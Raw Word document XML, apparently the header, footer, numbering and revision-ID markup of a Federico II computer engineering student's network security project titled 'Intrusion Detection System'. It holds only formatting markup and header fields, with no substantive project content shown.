    <w:r w:rsidRPr="00995558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54A84D13" wp14:editId="57A1AD17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EAA68B" w14:textId="77777777" w:rsidR="0041334B" w:rsidRPr="00995558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95558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995558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995558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 w:rsidRPr="00995558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995558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A84D13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49EAA68B" w14:textId="77777777" w:rsidR="0041334B" w:rsidRPr="00995558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995558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995558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995558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 w:rsidRPr="00995558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995558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995558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07A3E5E" wp14:editId="1CB79563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EB4A49" w14:textId="77777777" w:rsidR="00DB09FC" w:rsidRPr="00995558" w:rsidRDefault="00EE442E" w:rsidP="00DB09FC">
                          <w:pPr>
                            <w:pStyle w:val="PiedepginaUNIRc"/>
                            <w:ind w:right="180"/>
                          </w:pPr>
                          <w:r w:rsidRPr="00995558">
                            <w:t xml:space="preserve">Federico II </w:t>
                          </w:r>
                          <w:r w:rsidR="00DB09FC" w:rsidRPr="00995558">
                            <w:t xml:space="preserve">– Computer </w:t>
                          </w:r>
                          <w:r w:rsidR="00FF1FF6" w:rsidRPr="00995558">
                            <w:t>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7A3E5E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7EB4A49" w14:textId="77777777" w:rsidR="00DB09FC" w:rsidRPr="00995558" w:rsidRDefault="00EE442E" w:rsidP="00DB09FC">
                    <w:pPr>
                      <w:pStyle w:val="PiedepginaUNIRc"/>
                      <w:ind w:right="180"/>
                    </w:pPr>
                    <w:r w:rsidRPr="00995558">
                      <w:t xml:space="preserve">Federico II </w:t>
                    </w:r>
                    <w:r w:rsidR="00DB09FC" w:rsidRPr="00995558">
                      <w:t xml:space="preserve">– Computer </w:t>
                    </w:r>
                    <w:r w:rsidR="00FF1FF6" w:rsidRPr="00995558">
                      <w:t>Engineering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4BCFC624" w14:textId="77777777" w:rsidR="00EE442E" w:rsidRPr="00995558" w:rsidRDefault="00086720" w:rsidP="00EE442E">
    <w:pPr>
      <w:pStyle w:val="PiedepginaSecciones"/>
      <w:rPr>
        <w:noProof w:val="0"/>
      </w:rPr>
    </w:pPr>
    <w:r w:rsidRPr="00995558">
      <w:rPr>
        <w:noProof w:val="0"/>
      </w:rPr>
      <w:t xml:space="preserve"> </w:t>
    </w:r>
    <w:r w:rsidR="006A72ED" w:rsidRPr="00995558">
      <w:rPr>
        <w:noProof w:val="0"/>
      </w:rPr>
      <w:t xml:space="preserve">Activities for </w:t>
    </w:r>
    <w:r w:rsidR="00EE442E" w:rsidRPr="00995558">
      <w:rPr>
        <w:b/>
        <w:noProof w:val="0"/>
      </w:rPr>
      <w:t>INFORMATION SYSTEM AND BUSINESS INTELLIGENCE</w:t>
    </w:r>
  </w:p>
  <w:p w14:paraId="7CF13634" w14:textId="77777777" w:rsidR="0041334B" w:rsidRPr="00995558" w:rsidRDefault="0041334B" w:rsidP="00B96994">
    <w:pPr>
      <w:pStyle w:val="PiedepginaSecciones"/>
      <w:rPr>
        <w:noProof w:val="0"/>
        <w:color w:val="77777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837B8" w14:textId="77777777" w:rsidR="0005156B" w:rsidRPr="00995558" w:rsidRDefault="0005156B" w:rsidP="00C50246">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00995558">
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="3F66236C" w14:textId="77777777" w:rsidR="0005156B" w:rsidRPr="00995558" w:rsidRDefault="0005156B" w:rsidP="00C50246">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="0099555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57"/>
      <w:gridCol w:w="1276"/>
      <w:gridCol w:w="1842"/>
      <w:gridCol w:w="138"/>
      <w:gridCol w:w="1138"/>
      <w:gridCol w:w="1980"/>
    </w:tblGrid>
    <w:tr w:rsidR="006A72ED" w:rsidRPr="00995558" w14:paraId="7633DD6C" w14:textId="77777777" w:rsidTr="00EE442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57" w:type="dxa"/>
          <w:vMerge w:val="restart"/>
          <w:tcBorders>
            <w:left w:val="single" w:sz="4" w:space="0" w:color="0098CD"/>
          </w:tcBorders>
        </w:tcPr>
        <w:p w14:paraId="02ADF525" w14:textId="26680264" w:rsidR="006A72ED" w:rsidRPr="00995558" w:rsidRDefault="00840470" w:rsidP="00C65063">
          <w:pPr>
            <w:pStyle w:val="Textocajaactividades"/>
            <w:rPr>
              <w:color w:val="0098CD"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:rFonts w:cs="UnitOT-Light"/>
              <w:bCs/>
              <w:color w:val="0098CD"/>
              <w:sz w:val="20"/>
              <w:szCs w:val="20"/>
            </w:rPr>
            <w:t>NETWORK SECURITY</w:t>
          </w:r>
        </w:p>
      </w:tc>
      <w:tc>
        <w:tcPr>
          <w:tcW w:w="3118" w:type="dxa"/>
          <w:gridSpan w:val="2"/>
        </w:tcPr>
        <w:p w14:paraId="66A24C6E" w14:textId="77777777" w:rsidR="006A72ED" w:rsidRPr="00995558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995558"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gridSpan w:val="2"/>
          <w:tcBorders>
            <w:right w:val="single" w:sz="4" w:space="0" w:color="0098CD"/>
          </w:tcBorders>
        </w:tcPr>
        <w:p w14:paraId="7B5AF672" w14:textId="77777777" w:rsidR="006A72ED" w:rsidRPr="00995558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995558"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BAD6620" w14:textId="200F264B" w:rsidR="006A72ED" w:rsidRPr="00995558" w:rsidRDefault="00840470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Project</w:t>
          </w:r>
        </w:p>
      </w:tc>
    </w:tr>
    <w:tr w:rsidR="006A72ED" w:rsidRPr="00995558" w14:paraId="55EEAFA3" w14:textId="77777777" w:rsidTr="00EE442E">
      <w:trPr>
        <w:trHeight w:val="342"/>
        <w:jc w:val="left"/>
      </w:trPr>
      <w:tc>
        <w:tcPr>
          <w:tcW w:w="1457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3EC2658E" w14:textId="77777777" w:rsidR="006A72ED" w:rsidRPr="00995558" w:rsidRDefault="006A72ED" w:rsidP="00C65063">
          <w:pPr>
            <w:pStyle w:val="Textocajaactividades"/>
          </w:pPr>
        </w:p>
      </w:tc>
      <w:tc>
        <w:tcPr>
          <w:tcW w:w="3118" w:type="dxa"/>
          <w:gridSpan w:val="2"/>
          <w:tcBorders>
            <w:top w:val="single" w:sz="4" w:space="0" w:color="0098CD"/>
            <w:bottom w:val="single" w:sz="4" w:space="0" w:color="0098CD"/>
          </w:tcBorders>
        </w:tcPr>
        <w:p w14:paraId="42BED306" w14:textId="77777777" w:rsidR="006A72ED" w:rsidRPr="00C33E3C" w:rsidRDefault="006B7A5D" w:rsidP="00A90972">
          <w:pPr>
            <w:pStyle w:val="Encabezado"/>
            <w:rPr>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="es-ES"/>
            </w:rPr>
          </w:pPr>
          <w:proofErr w:type="spellStart"/>
          <w:r w:rsidRPr="00C33E3C">
            <w:rPr>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="es-ES"/>
            </w:rPr>
            <w:t>Matricola</w:t>
          </w:r>
          <w:proofErr w:type="spellEnd"/>
          <w:r w:rsidRPr="00C33E3C">
            <w:rPr>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="es-ES"/>
            </w:rPr>
            <w:t xml:space="preserve"> N. 0001/24312</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="2DB2703D" w14:textId="77777777" w:rsidR="00EE442E" w:rsidRPr="00C33E3C" w:rsidRDefault="00EE442E" w:rsidP="00A90972">
          <w:pPr>
            <w:pStyle w:val="Encabezado"/>
            <w:rPr>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="es-ES"/>
            </w:rPr>
          </w:pPr>
          <w:proofErr w:type="spellStart"/>
          <w:r w:rsidRPr="00C33E3C">
            <w:rPr>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="es-ES"/>
            </w:rPr>
            <w:t>Name</w:t>
          </w:r>
          <w:proofErr w:type="spellEnd"/>
          <w:r w:rsidRPr="00C33E3C">
            <w:rPr>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="es-ES"/>
            </w:rPr>
            <w:t xml:space="preserve">: Carlos Sampedro </w:t>
          </w:r>
          <w:proofErr w:type="spellStart"/>
          <w:r w:rsidRPr="00C33E3C">
            <w:rPr>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="es-ES"/>
            </w:rPr>
            <w:t>Mdz</w:t>
          </w:r>
          <w:proofErr w:type="spellEnd"/>
          <w:r w:rsidRPr="00C33E3C">
            <w:rPr>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="es-ES"/>
            </w:rPr>
            <w:t>.</w:t>
          </w:r>
        </w:p>
      </w:tc>
      <w:tc>
        <w:tcPr>
          <w:tcW w:w="1276" w:type="dxa"/>
          <w:gridSpan w:val="2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1888C95" w14:textId="189A0892" w:rsidR="006A72ED" w:rsidRPr="00995558" w:rsidRDefault="00840470" w:rsidP="000A7842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  <w:r w:rsidR="000A7842">
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
            </w:rPr>
            <w:t>5-</w:t>
          </w:r>
          <w:r w:rsidR="00681245" w:rsidRPr="00995558">
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
            </w:rPr>
            <w:t>1-2</w:t>
          </w:r>
          <w:r>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
            </w:rPr>
            <w:t>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5E86015A" w14:textId="731D54BE" w:rsidR="006A72ED" w:rsidRPr="00995558" w:rsidRDefault="00840470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Intrusion Detection System</w:t>
          </w:r>
        </w:p>
      </w:tc>
    </w:tr>
    <w:tr w:rsidR="00840470" w:rsidRPr="00940653" w14:paraId="73F7D897" w14:textId="77777777" w:rsidTr="00EE442E">
      <w:trPr>
        <w:gridAfter w:val="2"/>
        <w:wAfter w:w="3118" w:type="dxa"/>
        <w:trHeight w:val="342"/>
        <w:jc w:val="left"/>
      </w:trPr>
      <w:tc>
        <w:tcPr>
          <w:tcW w:w="1457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40D4E72B" w14:textId="77777777" w:rsidR="00840470" w:rsidRPr="00995558" w:rsidRDefault="00840470" w:rsidP="00C65063">
          <w:pPr>
            <w:pStyle w:val="Textocajaactividades"/>
          </w:pP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0765415D" w14:textId="77777777" w:rsidR="00840470" w:rsidRPr="00C33E3C" w:rsidRDefault="00840470" w:rsidP="009C1CA9">
          <w:pPr>
            <w:pStyle w:val="Encabezado"/>
            <w:jc w:val="center"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:lang w:val="es-ES"/>
            </w:rPr>
          </w:pPr>
        </w:p>
      </w:tc>
      <w:tc>
        <w:tcPr>
          <w:tcW w:w="1980" w:type="dxa"/>
          <w:gridSpan w:val="2"/>
          <w:tcBorders>
            <w:top w:val="single" w:sz="4" w:space="0" w:color="0098CD"/>
            <w:left w:val="nil"/>
            <w:bottom w:val="nil"/>
            <w:right w:val="nil"/>
          </w:tcBorders>
        </w:tcPr>
        <w:p w14:paraId="52892FB3" w14:textId="77777777" w:rsidR="00840470" w:rsidRPr="00C33E3C" w:rsidRDefault="00840470" w:rsidP="009C1CA9">
          <w:pPr>
            <w:pStyle w:val="Encabezado"/>
            <w:jc w:val="center"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:lang w:val="es-ES"/>
            </w:rPr>
          </w:pPr>
        </w:p>
      </w:tc>
    </w:tr>
    <w:tr w:rsidR="00840470" w:rsidRPr="00940653" w14:paraId="455B9C78" w14:textId="77777777" w:rsidTr="00EE442E">
      <w:trPr>
        <w:gridAfter w:val="2"/>
        <w:wAfter w:w="3118" w:type="dxa"/>
        <w:trHeight w:val="342"/>
        <w:jc w:val="left"/>
      </w:trPr>
      <w:tc>
        <w:tcPr>
          <w:tcW w:w="1457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063D0EA6" w14:textId="77777777" w:rsidR="00840470" w:rsidRPr="00C33E3C" w:rsidRDefault="00840470" w:rsidP="00A90972">
          <w:pPr>
            <w:pStyle w:val="Encabezado"/>
            <w:rPr>
              <w:lang w:val="es-ES"/>
            </w:rPr>
          </w:pP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7442CDD9" w14:textId="77777777" w:rsidR="00840470" w:rsidRPr="00C33E3C" w:rsidRDefault="00840470" w:rsidP="00A90972">
          <w:pPr>
            <w:pStyle w:val="Encabezado"/>
            <w:rPr>
              <w:lang w:val="es-ES"/>
            </w:rPr>
          </w:pPr>
        </w:p>
      </w:tc>
      <w:tc>
        <w:tcPr>
          <w:tcW w:w="198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1DFE4DC" w14:textId="77777777" w:rsidR="00840470" w:rsidRPr="00C33E3C" w:rsidRDefault="00840470" w:rsidP="00A90972">
          <w:pPr>
            <w:pStyle w:val="Encabezado"/>
            <w:rPr>
              <w:lang w:val="es-ES"/>
            </w:rPr>
          </w:pPr>
        </w:p>
      </w:tc>
    </w:tr>
  </w:tbl>
  <w:p w14:paraId="668E8B8C" w14:textId="77777777" w:rsidR="00EE442E" w:rsidRPr="00C33E3C" w:rsidRDefault="00EE442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A2F6AAB"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="00F6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F6F26"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C4A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660D1"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E058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9F3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D276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634AD"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="08F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93671"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="98CC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84DA4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B2F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10695"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="78F4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46A8D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="02FC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8F57F3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8CE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1698D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1DDA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94292"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="485E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836D5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7FD6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671F8"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="EE9C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F2941"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9812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62ED9"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C80058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7" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="3BE8006C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9B6C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5B2CC6"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C956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C3BBF"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B25C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647003"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E1C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E41E4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1A8E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6362A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5B02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008EE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="854E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35A97"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4A921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5" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="58690C2C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="699E2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926E5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A590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3562E2D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="76A0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6D5116"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0B9C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BDF2537"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B1C4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8E376E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5374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027678"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="498E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374701">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1362516803">
    <w:abstractNumId w:val="27"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="757217353">
    <w:abstractNumId w:val="30"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1211653879">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1301962603">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1319846109">
    <w:abstractNumId w:val="26"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="265815470">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1429345992">
    <w:abstractNumId w:val="29"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="1953897504">
    <w:abstractNumId w:val="28"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="1004894760">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="528032315">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="1267231200">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="1224951516">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="737552139">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="353775851">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="1305037695">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="17" w16cid:durableId="467169941">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="18" w16cid:durableId="125197380">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="19" w16cid:durableId="1193108030">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="20" w16cid:durableId="1103570337">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="21" w16cid:durableId="217059614">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="22" w16cid:durableId="1203249762">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="23" w16cid:durableId="2073236419">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="24" w16cid:durableId="1073432857">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="25" w16cid:durableId="901140885">
    <w:abstractNumId w:val="33"/>
  </w:num>
  <w:num w:numId="26" w16cid:durableId="1984776732">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="27" w16cid:durableId="1802385011">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="28" w16cid:durableId="1046370185">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="29" w16cid:durableId="1218013809">
    <w:abstractNumId w:val="31"/>
  </w:num>
  <w:num w:numId="30" w16cid:durableId="105777785">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="31" w16cid:durableId="1675231336">
    <w:abstractNumId w:val="32"/>
  </w:num>
  <w:num w:numId="32" w16cid:durableId="2031644972">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="33" w16cid:durableId="1883177123">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="34" w16cid:durableId="1386487403">
    <w:abstractNumId w:val="1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653"/>
    <w:rsid w:val="0000041C"/>
    <w:rsid w:val="00002FE1"/>
    <w:rsid w:val="00006EA2"/>
    <w:rsid w:val="00016003"/>
    <w:rsid w:val="00031C55"/>
    <w:rsid w:val="000458EE"/>
    <w:rsid w:val="0005156B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42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E528E"/>
    <w:rsid w:val="000F1443"/>
    <w:rsid w:val="000F518E"/>
    <w:rsid w:val="000F5592"/>
    <w:rsid w:val="000F7E60"/>
    <w:rsid w:val="00101C0C"/>
    <w:rsid w:val="00110055"/>
    <w:rsid w:val="00112B38"/>
    <w:rsid w:val="001238D9"/>
    <w:rsid w:val="00136277"/>
    <w:rsid w:val="00137CF9"/>
    <w:rsid w:val="00161226"/>
    <w:rsid w:val="00163FBB"/>
    <w:rsid w:val="001658DF"/>
    <w:rsid w:val="00170A90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217"/>
    <w:rsid w:val="001F69FE"/>
    <w:rsid w:val="00200BEB"/>
    <w:rsid w:val="0020102E"/>
    <w:rsid w:val="002036CA"/>
    <w:rsid w:val="002039FC"/>
    <w:rsid w:val="00213136"/>
    <w:rsid w:val="0021511C"/>
    <w:rsid w:val="002244C2"/>
    <w:rsid w:val="00227368"/>
    <w:rsid w:val="00227800"/>
    <w:rsid w:val="00233DC7"/>
    <w:rsid w:val="0023620B"/>
    <w:rsid w:val="00242F71"/>
    <w:rsid w:val="00244B66"/>
    <w:rsid w:val="00245860"/>
    <w:rsid w:val="0024674E"/>
    <w:rsid w:val="00250A71"/>
    <w:rsid w:val="0025366A"/>
    <w:rsid w:val="00253DA9"/>
    <w:rsid w:val="00260B21"/>
    <w:rsid w:val="002619F8"/>
    <w:rsid w:val="00265403"/>
    <w:rsid w:val="00273725"/>
    <w:rsid w:val="00277FAF"/>
    <w:rsid w:val="00283155"/>
    <w:rsid w:val="002845C6"/>
    <w:rsid w:val="002A19CE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1A7F"/>
    <w:rsid w:val="003224A0"/>
    <w:rsid w:val="00325452"/>
    <w:rsid w:val="00327C72"/>
    <w:rsid w:val="00330DE5"/>
    <w:rsid w:val="003369FB"/>
    <w:rsid w:val="0034363F"/>
    <w:rsid w:val="00351EC2"/>
    <w:rsid w:val="00361683"/>
    <w:rsid w:val="00363DED"/>
    <w:rsid w:val="00371618"/>
    <w:rsid w:val="00373C40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310EF"/>
    <w:rsid w:val="00445A11"/>
    <w:rsid w:val="00445E03"/>
    <w:rsid w:val="00446F8B"/>
    <w:rsid w:val="004476D3"/>
    <w:rsid w:val="004478AD"/>
    <w:rsid w:val="00455BA7"/>
    <w:rsid w:val="0045661A"/>
    <w:rsid w:val="004567F9"/>
    <w:rsid w:val="00466671"/>
    <w:rsid w:val="00472B27"/>
    <w:rsid w:val="00475059"/>
    <w:rsid w:val="004779BD"/>
    <w:rsid w:val="00484940"/>
    <w:rsid w:val="00491CB8"/>
    <w:rsid w:val="004A1A48"/>
    <w:rsid w:val="004A4989"/>
    <w:rsid w:val="004B46F2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3CCE"/>
    <w:rsid w:val="005366C0"/>
    <w:rsid w:val="00540750"/>
    <w:rsid w:val="005463ED"/>
    <w:rsid w:val="00551A69"/>
    <w:rsid w:val="00555B62"/>
    <w:rsid w:val="00561DC9"/>
    <w:rsid w:val="00575580"/>
    <w:rsid w:val="0058112D"/>
    <w:rsid w:val="005A1803"/>
    <w:rsid w:val="005A3DF4"/>
    <w:rsid w:val="005B7E49"/>
    <w:rsid w:val="005C0AF8"/>
    <w:rsid w:val="005C1D3F"/>
    <w:rsid w:val="005D15DB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A7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1245"/>
    <w:rsid w:val="006825B0"/>
    <w:rsid w:val="006A0985"/>
    <w:rsid w:val="006A210E"/>
    <w:rsid w:val="006A72ED"/>
    <w:rsid w:val="006B683F"/>
    <w:rsid w:val="006B7A5D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25095"/>
    <w:rsid w:val="00732FC1"/>
    <w:rsid w:val="0073726F"/>
    <w:rsid w:val="00744D29"/>
    <w:rsid w:val="00745244"/>
    <w:rsid w:val="007516EC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C26C6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3BD3"/>
    <w:rsid w:val="00824C6E"/>
    <w:rsid w:val="00824D80"/>
    <w:rsid w:val="00824F89"/>
    <w:rsid w:val="00826A4C"/>
    <w:rsid w:val="0083178B"/>
    <w:rsid w:val="0083542E"/>
    <w:rsid w:val="0083582D"/>
    <w:rsid w:val="00840470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C0C76"/>
    <w:rsid w:val="008D0AFD"/>
    <w:rsid w:val="008D2E81"/>
    <w:rsid w:val="008E1670"/>
    <w:rsid w:val="008F0709"/>
    <w:rsid w:val="008F1E4C"/>
    <w:rsid w:val="008F4290"/>
    <w:rsid w:val="009100B9"/>
    <w:rsid w:val="00910D0B"/>
    <w:rsid w:val="00911001"/>
    <w:rsid w:val="0091277A"/>
    <w:rsid w:val="00917348"/>
    <w:rsid w:val="00935FD2"/>
    <w:rsid w:val="009400C5"/>
    <w:rsid w:val="00940653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1C7E"/>
    <w:rsid w:val="00995558"/>
    <w:rsid w:val="009959A6"/>
    <w:rsid w:val="009A1065"/>
    <w:rsid w:val="009A3C7C"/>
    <w:rsid w:val="009A4CF7"/>
    <w:rsid w:val="009B0764"/>
    <w:rsid w:val="009B09A7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011FE"/>
    <w:rsid w:val="00A138C8"/>
    <w:rsid w:val="00A17600"/>
    <w:rsid w:val="00A20F71"/>
    <w:rsid w:val="00A237FB"/>
    <w:rsid w:val="00A239B2"/>
    <w:rsid w:val="00A302C5"/>
    <w:rsid w:val="00A30A01"/>
    <w:rsid w:val="00A313FB"/>
    <w:rsid w:val="00A4761C"/>
    <w:rsid w:val="00A60E8D"/>
    <w:rsid w:val="00A67DBC"/>
    <w:rsid w:val="00A71D15"/>
    <w:rsid w:val="00A71D6D"/>
    <w:rsid w:val="00A76AA2"/>
    <w:rsid w:val="00A76D45"/>
    <w:rsid w:val="00A90972"/>
    <w:rsid w:val="00A9140C"/>
    <w:rsid w:val="00AA0E4A"/>
    <w:rsid w:val="00AB2DE2"/>
    <w:rsid w:val="00AD4F85"/>
    <w:rsid w:val="00AF3B35"/>
    <w:rsid w:val="00B0196C"/>
    <w:rsid w:val="00B03326"/>
    <w:rsid w:val="00B04AF8"/>
    <w:rsid w:val="00B0793D"/>
    <w:rsid w:val="00B1656E"/>
    <w:rsid w:val="00B214C9"/>
    <w:rsid w:val="00B22F15"/>
    <w:rsid w:val="00B338AB"/>
    <w:rsid w:val="00B407F7"/>
    <w:rsid w:val="00B417CD"/>
    <w:rsid w:val="00B72D4C"/>
    <w:rsid w:val="00B8087F"/>
    <w:rsid w:val="00B814A5"/>
    <w:rsid w:val="00B86981"/>
    <w:rsid w:val="00B9216C"/>
    <w:rsid w:val="00B96994"/>
    <w:rsid w:val="00BA14FF"/>
    <w:rsid w:val="00BA172C"/>
    <w:rsid w:val="00BA17EF"/>
    <w:rsid w:val="00BB1161"/>
    <w:rsid w:val="00BC2EB1"/>
    <w:rsid w:val="00BE65ED"/>
    <w:rsid w:val="00BF2544"/>
    <w:rsid w:val="00BF4B49"/>
    <w:rsid w:val="00C006FD"/>
    <w:rsid w:val="00C01390"/>
    <w:rsid w:val="00C02629"/>
    <w:rsid w:val="00C06203"/>
    <w:rsid w:val="00C16D13"/>
    <w:rsid w:val="00C174A8"/>
    <w:rsid w:val="00C26997"/>
    <w:rsid w:val="00C27904"/>
    <w:rsid w:val="00C33E3C"/>
    <w:rsid w:val="00C34C2E"/>
    <w:rsid w:val="00C37777"/>
    <w:rsid w:val="00C42C46"/>
    <w:rsid w:val="00C446B8"/>
    <w:rsid w:val="00C4595C"/>
    <w:rsid w:val="00C46E7D"/>
    <w:rsid w:val="00C50246"/>
    <w:rsid w:val="00C513EF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A3634"/>
    <w:rsid w:val="00CA53D3"/>
    <w:rsid w:val="00CB0E97"/>
    <w:rsid w:val="00CB4376"/>
    <w:rsid w:val="00CB466D"/>
    <w:rsid w:val="00CC22FD"/>
    <w:rsid w:val="00CD7181"/>
    <w:rsid w:val="00CF1CAE"/>
    <w:rsid w:val="00D05107"/>
    <w:rsid w:val="00D1089E"/>
    <w:rsid w:val="00D11930"/>
    <w:rsid w:val="00D11ECE"/>
    <w:rsid w:val="00D1363F"/>
    <w:rsid w:val="00D17377"/>
    <w:rsid w:val="00D21CDC"/>
    <w:rsid w:val="00D30434"/>
    <w:rsid w:val="00D33335"/>
    <w:rsid w:val="00D3349B"/>
    <w:rsid w:val="00D336EC"/>
    <w:rsid w:val="00D37422"/>
    <w:rsid w:val="00D379E3"/>
    <w:rsid w:val="00D40AEE"/>
    <w:rsid w:val="00D43024"/>
    <w:rsid w:val="00D44A38"/>
    <w:rsid w:val="00D511BC"/>
    <w:rsid w:val="00D522FB"/>
    <w:rsid w:val="00D53EFF"/>
    <w:rsid w:val="00D723DB"/>
    <w:rsid w:val="00D74F0A"/>
    <w:rsid w:val="00D771BD"/>
    <w:rsid w:val="00D901FA"/>
    <w:rsid w:val="00D95965"/>
    <w:rsid w:val="00D961B2"/>
    <w:rsid w:val="00D97F9B"/>
    <w:rsid w:val="00DA1A7B"/>
    <w:rsid w:val="00DA4A6D"/>
    <w:rsid w:val="00DA6FF8"/>
    <w:rsid w:val="00DB09D7"/>
    <w:rsid w:val="00DB09FC"/>
    <w:rsid w:val="00DB4BD9"/>
    <w:rsid w:val="00DB5335"/>
    <w:rsid w:val="00DC3808"/>
    <w:rsid w:val="00DD0B32"/>
    <w:rsid w:val="00DD2649"/>
    <w:rsid w:val="00DD27AB"/>
    <w:rsid w:val="00DE4822"/>
    <w:rsid w:val="00DF0BC0"/>
    <w:rsid w:val="00DF3389"/>
    <w:rsid w:val="00DF784B"/>
    <w:rsid w:val="00E0323A"/>
    <w:rsid w:val="00E03B8E"/>
    <w:rsid w:val="00E10D9B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1EF0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442E"/>
    <w:rsid w:val="00EE6C97"/>
    <w:rsid w:val="00EF3D1C"/>
    <w:rsid w:val="00EF3DD3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4948"/>
    <w:rsid w:val="00F65B6D"/>
    <w:rsid w:val="00F719D6"/>
    <w:rsid w:val="00F736A2"/>
    <w:rsid w:val="00F77A3B"/>
    <w:rsid w:val="00FA3F29"/>
    <w:rsid w:val="00FA5FF9"/>
    <w:rsid w:val="00FB0A6F"/>
    <w:rsid w:val="00FC582A"/>
    <w:rsid w:val="00FD1A84"/>
